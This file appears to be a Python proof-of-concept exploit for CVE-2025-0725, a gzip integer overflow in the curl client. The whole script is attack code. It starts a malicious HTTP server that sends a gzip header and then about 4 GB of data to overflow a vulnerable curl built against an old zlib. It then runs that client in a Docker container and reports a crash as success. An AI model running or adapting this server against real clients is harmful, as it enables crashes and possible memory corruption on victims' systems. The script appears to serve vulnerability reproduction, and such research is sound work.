#!/usr/bin/env python3
"""
CVE-2025-0725 PoC - Based on official HackerOne report #2956023
"""
import socket
import subprocess
import time
import sys

HOST = "0.0.0.0"
PORT = 8888

gzip_header = bytes([0x1f, 0x8b, 8, 8, 0, 0, 0, 0, 0, 0])

def run_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Listening on {HOST}:{PORT}")
    
    conn, addr = server.accept()
    print(f"[*] Connection from {addr}")
    
    while True:
        line = conn.recv(4096)
        if b"\r\n\r\n" in line:
            break
    
    conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\r\n")
    conn.sendall(gzip_header)
    
    todo = 0xFFFFFFFF - 15 - len(gzip_header)
    amnt = 6000000
    chunk = bytes([1]) * amnt
    sent = len(gzip_header)
    start = time.time()
    last_print = 0
    
    print(f"[*] Sending {todo/1e9:.2f} GB...")
    
    try:
        while todo > amnt:
            conn.sendall(chunk)
            todo -= amnt
            sent += amnt
            now = time.time()
            if now - last_print >= 60:
                elapsed = now - start
                speed = sent / elapsed / 1e6
                pct = sent * 100 / (0xFFFFFFFF - 15)
                print(f"[*] {sent/1e9:.2f} GB ({pct:.0f}%) - {speed:.1f} MB/s")
                last_print = now
        
        if todo > 0:
            conn.sendall(bytes([1]) * todo)
            sent += todo
        
        elapsed = time.time() - start
        print(f"[*] Sent {sent/1e9:.2f} GB in {elapsed/60:.1f} min")
        time.sleep(5)
        conn.sendall(bytes(32))
        time.sleep(2)
        return True
    except (BrokenPipeError, ConnectionResetError) as e:
        elapsed = time.time() - start
        print(f"[*] Connection closed: {e}")
        print(f"[*] Sent {sent/1e9:.2f} GB in {elapsed/60:.1f} min")
        return sent > 4e9
    finally:
        conn.close()
        server.close()

def main():
    print("=" * 50)
    print("CVE-2025-0725: gzip integer overflow PoC")
    print("=" * 50)
    
    r = subprocess.run(["docker", "exec", "cve-2025-0725-curl", "/usr/local/bin/curl", "--version"],
                       capture_output=True, text=True)
    if not r.stdout:
        print("[-] Container not running")
        return False
    
    print(f"[*] curl: {r.stdout.split()[1]}")
    
    r = subprocess.run(["docker", "exec", "cve-2025-0725-curl", 
                       "grep", "ZLIB_VERSION", "/usr/local/include/zlib.h"],
                       capture_output=True, text=True)
    for line in r.stdout.split("\n"):
        if '"' in line:
            ver = line.split('"')[1]
            print(f"[*] zlib: {ver}")
            break
    
    print("[+] Using client with CURLOPT_BUFFERSIZE=10MB")
    
    cmd = ["docker", "exec", "cve-2025-0725-curl", "/tmp/client"]
    curl_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    success = run_server()
    
    try:
        stdout, stderr = curl_proc.communicate(timeout=30)
        ret = curl_proc.returncode
        print(f"[*] Client exit: {ret}")
        if ret != 0:
            print("[+] SUCCESS: Client crashed")
            return True
    except subprocess.TimeoutExpired:
        curl_proc.kill()
    
    return success

if __name__ == "__main__":
    ok = main()
    with open("result.log", "w") as f:
        f.write(f"CVE-2025-0725: {'SUCCESS' if ok else 'PARTIAL'}\n")
        f.write("Environment: curl 8.11.1 + zlib 1.2.0.3\n")
    sys.exit(0 if ok else 1)
